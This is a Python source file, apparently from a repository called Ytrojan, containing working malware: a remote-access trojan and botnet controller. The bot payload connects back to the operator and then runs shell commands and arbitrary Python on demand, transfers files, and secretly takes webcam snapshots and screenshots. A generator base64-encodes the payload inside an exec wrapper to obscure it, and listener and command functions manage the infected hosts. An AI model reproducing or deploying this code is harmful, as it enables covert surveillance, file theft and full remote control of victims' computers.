# github.com/ycy20090311/Ytrojan

import base64
import time,socket

BotNet = {}

BotCode = """
import platform
import subprocess
import time,socket
import os,cv2,pyscreenshot

try:
    BotSocket = socket.socket()
    BotSocket.connect(("{0}",{1}))
    SendMsg = b"system %b %b %b" % (os.name.encode(),platform.node().encode(),platform.machine().encode())
    BotSocket.sendall(SendMsg)
    while True:
        RecvMsg = BotSocket.recv(20)
        if RecvMsg.split()[0] == b"size":
            RecvSize = int(RecvMsg.split(b" ",1)[1])
            RecvMsg = b""
            while len(RecvMsg) < RecvSize:
                RecvMsg += BotSocket.recv(1024)
            try:
                if RecvMsg.split()[0] == b"shell":
                    shell = subprocess.Popen(RecvMsg.split(b" ",1)[1],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                    SendMsg = b"shell %b" % shell.stdout.read() + shell.stderr.read()
                    if SendMsg == b"shell ":SendMsg = b"shell ok"
                elif RecvMsg.split()[0] == b"pycode":
                    exec(RecvMsg.split(b" ",1)[1])
                    SendMsg = b"pycode ok"
                elif RecvMsg.split()[0] == b"getfile":
                    SendFile = open(RecvMsg.split(b" ",2)[2],"rb")
                    SendMsg = b"getfile %b %b" % (RecvMsg.split(b" ",2)[1],SendFile.read())
                    SendFile.close()
                elif RecvMsg.split()[0] == b"putfile":
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    SendMsg = b"putfile ok"
                elif RecvMsg.split()[0] == b"webcamsnap":
                    WebCamsnap = cv2.VideoCapture(0)
                    Out,Image = WebCamsnap.read()
                    if Out == True:
                        SendMsg = b"webcamsnap %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
                    else:
                        SendMsg = b"webcamsmap no"
                elif RecvMsg.split()[0] == b"screenshot":
                    Image = pyscreenshot.grab()
                    Image.save(".screenshot.jpg")
                    Image = cv2.imread(".screenshot.jpg")
                    SendMsg = b"screenshot %b %b" % (RecvMsg.split(b" ",2)[1],cv2.imencode(".jpg",Image)[1].tobytes())
                    os.remove(".screenshot.jpg")
                else:
                    SendMsg = b"no"
            except:
                SendMsg = b"%b no" % RecvMsg.split()[0]
            BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
            time.sleep(0.3)
            BotSocket.sendall(SendMsg)
except:
    BotSocket.close()
    exit(0)         
"""

def Generate(BotSrc,BotIp,BotPort):
    try:
        BotFile = open(BotSrc,"w+")
        BotFile.write("import base64;exec(base64.b64decode(%s))" % str(base64.b64encode(str(BotCode.format(BotIp,BotPort)).encode())))
        BotFile.close()
        return "ok"
    except:
        return "no"
    
def Listen(ControlPort):
    ControlSocket = socket.socket()
    ControlSocket.bind(("",int(ControlPort)))
    ControlSocket.listen()
    while True:
        BotSocket,BotAddr = ControlSocket.accept()
        RecvMsg = BotSocket.recv(1024)
        if RecvMsg.split()[0] == b"system":
            BotNet[BotSocket] = "%s %s" % (RecvMsg.split(b" ",1)[1].decode(),BotSocket.getpeername()[0])

def Run(BotSocket,Command):
    try:       
        SendMsg = Command.encode()
        if SendMsg.split()[0] == b"putfile":
            SendFile = open(SendMsg.split(b" ",2)[2],"rb+")
            SendMsg = b"putfile %b %b" % (SendMsg.split(b" ",2)[1],SendFile.read())
            SendFile.close()
        BotSocket.sendall(b"size %b" % str(len(SendMsg)).encode())
        time.sleep(0.3)
        BotSocket.sendall(SendMsg)
        RecvMsg = BotSocket.recv(20)
        if RecvMsg.split()[0] == b"size":
            RecvSize = int(RecvMsg.split(b" ",1)[1])
            RecvMsg = b""
            while len(RecvMsg) < RecvSize:
                RecvMsg += BotSocket.recv(1024)
            if RecvMsg.split()[0] == b"shell":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    return("\033[32m[INFO] Run Shell For %s \033[0m \n%s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",1)[1].decode()))
                else:
                    return("\033[31m[ERROR] Run Shell For %s \033[0m \nCommand execution failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"pycode":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    return("\033[32m[INFO] Run PythonCode For %s \033[0m \nPythonCode execution succeeded" % BotSocket.getpeername()[0])
                else:
                    return("\033[31m[ERROR] Run PythonCode for %s \033[0m \nThe PythonCode execution failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"getfile":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return("\033[32m[INFO] Getfile For %s \033[0m\nThe file was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
                else:
                    return("\033[31m[ERROR] Getfile For %s \033[0m \nThe file download failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"putfile":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    return("\033[32m[INFO] Putfile For %s \033[0m\nThe file is uploaded successfully" % BotSocket.getpeername()[0])
                else:
                    return("\033[31m[ERROR] Putfile For %s \033[0m \nFile upload failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"webcamsnap":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return("\033[32m[INFO] WebCamsnap For %s \033[0m \nWebCamsnap was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
                else:
                    return("\033[31m[ERROR] WebCamsnap For %s \033[0m \nCamera acquisition failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"screenshot":
                if RecvMsg.split(b" ",1)[1] != b"no":
                    RecvFile = open(RecvMsg.split(b" ",2)[1],"wb+")
                    RecvFile.write(RecvMsg.split(b" ",2)[2])
                    RecvFile.close()
                    return("\033[32m[INFO] ScreenShot For %s \033[0m \nScreenShot was downloaded successfully to %s" % (BotSocket.getpeername()[0],RecvMsg.split(b" ",2)[1].decode()))
                else:
                    return("\033[31m[ERROR] ScreenShot For %s \033[0m \nScreenShot acquisition failed" % BotSocket.getpeername()[0])
            elif RecvMsg.split()[0] == b"no":
                return("\033[31m[ERROR] There is no such command\033[0m")
    except:
        del BotNet[BotSocket]
        BotSocket.close()
        return("\033[31m[ERROR] The session has been interrupted\033[0m")
